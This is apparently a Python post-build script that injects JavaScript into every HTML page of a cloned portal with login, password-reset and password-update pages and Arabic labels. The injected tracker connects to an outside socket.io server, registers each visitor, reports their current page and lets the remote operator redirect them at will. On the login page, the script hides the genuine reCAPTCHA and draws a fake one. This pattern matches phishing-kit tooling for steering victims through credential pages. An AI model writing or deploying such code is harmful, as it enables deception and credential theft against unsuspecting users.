from pathlib import Path
import re

TRACKER = """<script>
(function(){
  var SVID=localStorage.getItem('visitorId');
  var s=document.createElement('script');
  s.src='https://singlewindow.fly.dev/socket.io/socket.io.js';
  s.onload=function(){
    var sock=io('https://singlewindow.fly.dev',{transports:['polling','websocket'],reconnection:true});
    var m={'/':'الصفحة الرئيسية','/service':'صفحة الخدمات','/login':'تسجيل الدخول','/reset':'نسيت كلمة المرور','/update':'تحديث كلمة المرور'};
    function g(){var p=window.location.pathname;if(p.startsWith('/services/'))return 'خدمة: '+decodeURIComponent(p.replace('/services/','')).replace(/-/g,' ');return m[p]||p;}
    sock.on('connect',function(){
      sock.emit('visitor:register',{existingVisitorId:SVID,currentPage:g()});
      sock.emit('visitor:pageEnter',g());
    });
    sock.on('successfully-connected',function(d){if(d&&d.pid)localStorage.setItem('visitorId',d.pid);});
    sock.on('visitor:navigate',function(page){
      if(!page)return;
      var p=page.startsWith('/')?page:'/'+page;
      window.location.href=p;
    });
    window._sw_socket=sock;
  };
  document.head.appendChild(s);
})();
</script>"""

# CSS to fix reCAPTCHA display in login page - replace spinner with fake reCAPTCHA
CAPTCHA_HIDE_CSS = """<style>
.Captcha3940957316__captchaLoader { display: none !important; }
.Captcha3940957316__captcha { display: none !important; }
.Captcha3940957316__root::before {
  content: '';
  display: block;
  width: 304px;
  height: 78px;
  background: #f9f9f9;
  border: 1px solid #d3d3d3;
  border-radius: 3px;
  box-shadow: 0 0 4px rgba(0,0,0,.08);
}
</style>
<script>
(function(){
  var root = document.querySelector('.Captcha3940957316__root');
  if(!root) return;
  root.innerHTML = '';
  var box = document.createElement('div');
  box.style.cssText = 'width:304px;height:78px;background:#f9f9f9;border:1px solid #d3d3d3;border-radius:3px;display:flex;align-items:center;padding:0 12px;gap:12px;box-shadow:0 0 4px rgba(0,0,0,.08);';
  var cb = document.createElement('input');
  cb.type='checkbox';
  cb.style.cssText='width:24px;height:24px;cursor:pointer;flex-shrink:0;';
  var label = document.createElement('span');
  label.textContent = 'أنا لست برنامج روبوت';
  label.style.cssText='font-size:14px;color:#333;font-family:Roboto,sans-serif;';
  var logo = document.createElement('div');
  logo.style.cssText='margin-right:auto;display:flex;flex-direction:column;align-items:center;';
  logo.innerHTML='<img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" style="width:32px;height:32px;"><span style="font-size:8px;color:#555;">reCAPTCHA</span><span style="font-size:7px;color:#999;">Privacy - Terms</span>';
  box.appendChild(cb);
  box.appendChild(label);
  box.appendChild(logo);
  root.appendChild(box);
})();
</script>"""

# Support both running from repo root and from client/ subdirectory (Netlify runs from client/)
import os
if Path('dist').exists():
    dist = Path('dist')
elif Path('../dist').exists():
    dist = Path('../dist')
else:
    dist = Path('dist')  # fallback

count = 0
for f in list(dist.glob('*.html')) + list(dist.glob('sw-services/*.html')):
    try:
        c = f.read_text(encoding='utf-8', errors='ignore')
        # Remove old tracker
        c = re.sub(r'<script>\s*\(function\(\)\{[^<]{30,}?_sw_socket[^<]*?\}\)\(\);\s*</script>', '', c, flags=re.DOTALL)
        c = re.sub(r'<script>\s*\(function\(\)\s*\{[^<]{30,}?_sw_socket.*?\}\)\(\);\s*</script>', '', c, flags=re.DOTALL)
        # Hide reCAPTCHA in login page
        extra = CAPTCHA_HIDE_CSS if f.name == 'sw-login.html' else ''
        if '</head>' in c:
            f.write_text(c.replace('</head>', extra + TRACKER + '</head>', 1), encoding='utf-8')
        elif '</body>' in c:
            f.write_text(c.replace('</body>', extra + TRACKER + '</body>', 1), encoding='utf-8')
        else:
            continue
        count += 1
        print(f"Injected: {f.name}")
    except Exception as e:
        print(f"Error {f.name}: {e}")

print(f"Done: {count} files updated")
